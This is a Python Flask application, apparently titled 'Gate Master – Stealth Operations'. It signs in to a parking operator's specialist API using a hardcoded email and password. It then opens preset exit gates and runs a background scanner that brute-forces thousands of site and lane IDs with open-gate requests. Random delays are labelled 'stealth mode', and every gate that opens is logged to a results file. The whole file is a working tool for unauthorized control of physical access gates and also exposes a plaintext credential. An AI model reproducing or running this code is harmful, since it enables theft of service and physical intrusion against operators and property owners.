#!/usr/bin/env python3
from flask import Flask, render_template_string, jsonify, request, send_file
import requests
import time
import threading
import logging
import random
import os
from datetime import datetime

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# --- Configuration ---
EMAIL = "security@555capitolmall.com"
PASSWORD = "555_Security"
TOKEN_URL = "https://auth.metropolis.io/realms/metropolis/protocol/openid-connect/token"
API_BASE_URL = "https://specialist.api.metropolis.io/api/specialist"
CLIENT_ID = "metropolis-web-client"
RESULTS_FILE = "found_gates.txt"

# Preset Gates (Control Tab)
GATES_CONFIG = [
    {"id": "5568", "name": "6th Street Exit", "site_id": "4005"},
    {"id": "5569", "name": "L Street Exit", "site_id": "4005"},
    {"id": "5565", "name": "Bank of America Exit", "site_id": "4007"},
]

# --- Global State ---
access_token = None
refresh_token = None
token_expiry_time = 0
token_lock = threading.Lock()
file_lock = threading.Lock()

# Scanner State
scanner_state = {
    "active": False,
    "current_site": 5000,
    "current_gate": 1000,
    "total_scanned": 0,
    "found_count": 0,
    "last_status": "Idle"
}

# --- Auth System (Runs in Background) ---
def get_new_tokens():
    global access_token, refresh_token, token_expiry_time
    payload = {
        'client_id': CLIENT_ID,
        'grant_type': 'password',
        'username': EMAIL,
        'password': PASSWORD,
        'scope': 'openid'
    }
    try:
        response = requests.post(TOKEN_URL, data=payload, timeout=10)
        response.raise_for_status()
        data = response.json()
        with token_lock:
            access_token = data.get('access_token')
            refresh_token = data.get('refresh_token')
            token_expiry_time = time.time() + data.get('expires_in', 3600) - 60
        return True
    except Exception as e:
        logging.error(f"Auth failed: {e}")
        return False

def refresh_tokens():
    global access_token, refresh_token, token_expiry_time
    if not refresh_token: return get_new_tokens()
    
    payload = {'client_id': CLIENT_ID, 'grant_type': 'refresh_token', 'refresh_token': refresh_token}
    try:
        response = requests.post(TOKEN_URL, data=payload, timeout=10)
        response.raise_for_status()
        data = response.json()
        with token_lock:
            access_token = data.get('access_token')
            token_expiry_time = time.time() + data.get('expires_in', 3600) - 60
            refresh_token = data.get('refresh_token', refresh_token)
        return True
    except: return get_new_tokens()

def token_manager():
    if not get_new_tokens(): logging.error("Initial auth failed")
    while True:
        if time.time() >= token_expiry_time: refresh_tokens()
        time.sleep(10)

threading.Thread(target=token_manager, daemon=True).start()

# --- The "Stealth" Background Scanner ---
def save_hit(site, gate, response_data):
    """Saves successful hits to a text file safely."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] FOUND: Site {site} | Gate {gate} | Response: {response_data}\n"
    
    with file_lock:
        with open(RESULTS_FILE, "a") as f:
            f.write(entry)

def scanner_loop(start_site, end_site, start_gate, end_gate):
    global scanner_state
    
    # Ensure file exists
    if not os.path.exists(RESULTS_FILE):
        with open(RESULTS_FILE, "w") as f: f.write("--- SCAN RESULTS ---\n")

    logging.info("Starting Background Scanner...")
    
    # Loop Sites
    for site_id in range(start_site, end_site + 1):
        scanner_state["current_site"] = site_id
        
        # Loop Gates
        for lane_id in range(start_gate, end_gate + 1):
            if not scanner_state["active"]:
                scanner_state["last_status"] = "Stopped by user"
                return

            scanner_state["current_gate"] = lane_id
            scanner_state["last_status"] = f"Scanning Site {site_id} / Gate {lane_id}"
            
            # 1. Get Token
            with token_lock: current_token = access_token
            
            # 2. Make Request
            url = f"{API_BASE_URL}/site/{site_id}/lane/{lane_id}/open-gate"
            headers = {'Authorization': f'Bearer {current_token}', 'Content-Type': 'application/json'}
            
            try:
                # We use a short timeout so we don't hang
                r = requests.post(url, headers=headers, timeout=5)
                
                # Check for Success (looking for success: true in JSON)
                success = False
                try:
                    data = r.json()
                    if data.get('success') is True: success = True
                except: pass

                if success:
                    logging.info(f"HIT! Site {site_id} Gate {lane_id}")
                    scanner_state["found_count"] += 1
                    save_hit(site_id, lane_id, data)
                elif r.status_code == 401:
                    refresh_tokens() # Urgent refresh needed

            except Exception as e:
                pass # Silent fail on network errors to keep moving
            
            scanner_state["total_scanned"] += 1
            
            # 3. Random Sleep (Stealth Mode)
            sleep_time = random.uniform(3, 10)
            time.sleep(sleep_time)

    scanner_state["active"] = False
    scanner_state["last_status"] = "Scan Range Completed"

# --- HTML Interface ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Metropolis Stealth Ops</title>
    <style>
        :root {
            --bg: #121212;
            --surface: #1e1e1e;
            --primary: #bb86fc;
            --secondary: #03dac6;
            --error: #cf6679;
            --text: #e0e0e0;
        }
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .header {
            width: 100%;
            background: linear-gradient(180deg, #2d2d2d 0%, #121212 100%);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #333;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
        }
        
        h1 { margin: 0; font-size: 1.5rem; letter-spacing: 1px; color: var(--primary); }
        .subtitle { font-size: 0.8rem; opacity: 0.7; margin-top: 5px; }

        .container {
            width: 100%;
            max-width: 600px;
            padding: 15px;
            flex: 1;
        }

        /* Tabs */
        .tabs {
            display: flex;
            background: var(--surface);
            border-radius: 12px;
            padding: 5px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }
        
        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            cursor: pointer;
            border-radius: 8px;
            font-weight: 600;
            transition: 0.3s;
            color: #888;
        }
        
        .tab.active {
            background: var(--primary);
            color: #000;
        }

        .tab-content { display: none; animation: fadeEffect 0.4s; }
        .tab-content.active { display: block; }
        @keyframes fadeEffect { from {opacity: 0;} to {opacity: 1;} }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: bold;
            margin-bottom: 12px;
            cursor: pointer;
            transition: transform 0.1s;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            text-transform: uppercase;
        }
        
        .btn:active { transform: scale(0.98); }
        
        .btn-gate { background: linear-gradient(45deg, #2196F3, #21CBF3); color: white; }
        .btn-start { background: linear-gradient(45deg, #00b894, #00cec9); color: white; }
        .btn-stop { background: linear-gradient(45deg, #d63031, #ff7675); color: white; }
        .btn-download { background: #34495e; color: white; border: 1px solid #555; }

        /* Scanner Dashboard */
        .status-card {
            background: var(--surface);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #333;
        }

        .stat-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        
        .stat-label { color: #888; font-size: 0.9rem; }
        .stat-value { font-family: monospace; font-size: 1.1rem; color: var(--secondary); }

        .status-indicator {
            text-align: center;
            padding: 8px;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.8rem;
            margin-bottom: 15px;
        }
        .status-running { background: rgba(3, 218, 198, 0.2); color: var(--secondary); border: 1px solid var(--secondary); }
        .status-idle { background: rgba(255, 255, 255, 0.1); color: #888; border: 1px solid #444; }

        .range-inputs {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .input-group label { display: block; font-size: 0.75rem; color: #888; margin-bottom: 4px; }
        .input-group input {
            width: 100%;
            background: #121212;
            border: 1px solid #333;
            color: white;
            padding: 10px;
            border-radius: 6px;
            text-align: center;
        }

        #toaster {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #333;
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 0.9rem;
            opacity: 0;
            transition: 0.3s;
            pointer-events: none;
            z-index: 100;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>GATE MASTER</h1>
        <div class="subtitle">Stealth Operations</div>
    </div>

    <div class="container">
        <div class="tabs">
            <div class="tab active" onclick="switchTab(0)">CONTROL</div>
            <div class="tab" onclick="switchTab(1)">SCANNER</div>
        </div>

        <div id="tab-0" class="tab-content active">
            <div class="status-card">
                <div style="text-align:center; color:#888; margin-bottom:15px;">PRESET GATES</div>
                {% for gate in gates %}
                <button class="btn btn-gate" onclick="openGate('{{gate.id}}', '{{gate.name}}', '{{gate.site_id}}')">
                    OPEN {{ gate.name }}
                </button>
                {% endfor %}
            </div>
            
            <div class="status-card">
                <div style="text-align:center; color:#888; margin-bottom:10px;">MANUAL OVERRIDE</div>
                <div class="range-inputs">
                    <div class="input-group">
                        <label>SITE ID</label>
                        <input id="manual-site" type="number" placeholder="4005">
                    </div>
                    <div class="input-group">
                        <label>LANE ID</label>
                        <input id="manual-lane" type="number" placeholder="5568">
                    </div>
                </div>
                <button class="btn btn-gate" style="background: linear-gradient(45deg, #6c5ce7, #a29bfe);" onclick="manualOpen()">EXECUTE</button>
            </div>
        </div>

        <div id="tab-1" class="tab-content">
            <div class="status-card">
                <div id="scan-status-badge" class="status-indicator status-idle">SCANNER IDLE</div>
                
                <div class="stat-row">
                    <span class="stat-label">Current Target</span>
                    <span class="stat-value" id="current-target">---</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Total Scanned</span>
                    <span class="stat-value" id="total-scanned">0</span>
                </div>
                <div class="stat-row">
                    <span class="stat-label">Gates Found</span>
                    <span class="stat-value" id="found-count" style="color: #00b894">0</span>
                </div>
                <div style="font-size: 0.7rem; color: #555; text-align: center; margin-top: 5px;">
                    Delay: Random 3-10s (Stealth Mode)
                </div>
            </div>

            <div class="status-card">
                <div style="text-align:center; color:#888; margin-bottom:10px;">CONFIGURATION</div>
                <div class="range-inputs">
                    <div class="input-group">
                        <label>START SITE</label>
                        <input id="site-start" value="5000">
                    </div>
                    <div class="input-group">
                        <label>END SITE</label>
                        <input id="site-end" value="6500">
                    </div>
                </div>
                <div class="range-inputs">
                    <div class="input-group">
                        <label>START GATE</label>
                        <input id="gate-start" value="1000">
                    </div>
                    <div class="input-group">
                        <label>END GATE</label>
                        <input id="gate-end" value="7500">
                    </div>
                </div>
                
                <button id="btn-start" class="btn btn-start" onclick="toggleScan(true)">START BACKGROUND SCAN</button>
                <button id="btn-stop" class="btn btn-stop" onclick="toggleScan(false)" style="display:none">STOP OPERATION</button>
            </div>

            <a href="/download-results" target="_blank" style="text-decoration:none">
                <button class="btn btn-download">📥 DOWNLOAD RESULTS FILE</button>
            </a>
        </div>
    </div>

    <div id="toaster">Notification</div>

    <script>
        function switchTab(n) {
            document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', i===n));
            document.querySelectorAll('.tab-content').forEach((c,i) => c.classList.toggle('active', i===n));
        }

        function showToast(msg) {
            const t = document.getElementById('toaster');
            t.innerText = msg;
            t.style.opacity = '1';
            t.style.bottom = '40px';
            setTimeout(() => {
                t.style.opacity = '0';
                t.style.bottom = '20px';
            }, 3000);
        }

        async function openGate(lane, name, site) {
            showToast(`Opening ${name}...`);
            try {
                const res = await fetch('/api/open', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lane_id: lane, site_id: site})
                });
                const data = await res.json();
                if(data.success) showToast("SUCCESS: Gate Opened");
                else showToast("FAILED: " + (data.message || "Error"));
            } catch(e) { showToast("Network Error"); }
        }

        function manualOpen() {
            const s = document.getElementById('manual-site').value;
            const l = document.getElementById('manual-lane').value;
            if(!s || !l) return showToast("Enter IDs first");
            openGate(l, `Gate ${l}`, s);
        }

        async function toggleScan(start) {
            if(start) {
                const config = {
                    start_site: parseInt(document.getElementById('site-start').value),
                    end_site: parseInt(document.getElementById('site-end').value),
                    start_gate: parseInt(document.getElementById('gate-start').value),
                    end_gate: parseInt(document.getElementById('gate-end').value)
                };
                await fetch('/api/scanner/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(config)
                });
                showToast("Background Scan Started");
            } else {
                await fetch('/api/scanner/stop', {method: 'POST'});
                showToast("Stopping Scanner...");
            }
            updateUI();
        }

        async function updateUI() {
            try {
                const res = await fetch('/api/scanner/status');
                const data = await res.json();
                
                // Update Badge
                const badge = document.getElementById('scan-status-badge');
                const btnStart = document.getElementById('btn-start');
                const btnStop = document.getElementById('btn-stop');

                if(data.active) {
                    badge.innerText = "SCANNING IN PROGRESS";
                    badge.className = "status-indicator status-running";
                    btnStart.style.display = 'none';
                    btnStop.style.display = 'block';
                } else {
                    badge.innerText = "SCANNER IDLE";
                    badge.className = "status-indicator status-idle";
                    btnStart.style.display = 'block';
                    btnStop.style.display = 'none';
                }

                document.getElementById('current-target').innerText = `S:${data.current_site} / G:${data.current_gate}`;
                document.getElementById('total-scanned').innerText = data.total_scanned;
                document.getElementById('found-count').innerText = data.found_count;

            } catch(e) { console.log(e); }
        }

        // Poll every 2 seconds
        setInterval(updateUI, 2000);
        updateUI();
    </script>
</body>
</html>
'''

# --- Routes ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, gates=GATES_CONFIG)

@app.route('/api/open', methods=['POST'])
def api_open():
    data = request.json
    with token_lock: current_token = access_token
    
    url = f"{API_BASE_URL}/site/{data['site_id']}/lane/{data['lane_id']}/open-gate"
    headers = {'Authorization': f'Bearer {current_token}', 'Content-Type': 'application/json'}
    
    try:
        r = requests.post(url, headers=headers, timeout=10)
        # Parse logic
        try:
            js = r.json()
            success = js.get('success') is True
            msg = js.get('message', '')
        except:
            success = False
            msg = "Parsing Error"
            
        return jsonify({'success': success, 'message': msg})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/scanner/start', methods=['POST'])
def start_scan():
    d = request.json
    if scanner_state['active']: return jsonify({'success': False, 'msg': 'Already running'})
    
    scanner_state['active'] = True
    scanner_state['total_scanned'] = 0
    scanner_state['found_count'] = 0
    
    # Start Thread
    t = threading.Thread(target=scanner_loop, args=(d['start_site'], d['end_site'], d['start_gate'], d['end_gate']))
    t.daemon = True # Ensures thread runs in background but doesn't block exit
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/scanner/stop', methods=['POST'])
def stop_scan():
    scanner_state['active'] = False
    return jsonify({'success': True})

@app.route('/api/scanner/status')
def scan_status():
    return jsonify(scanner_state)

@app.route('/download-results')
def download_results():
    if not os.path.exists(RESULTS_FILE):
        return "No results yet.", 404
    return send_file(RESULTS_FILE, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
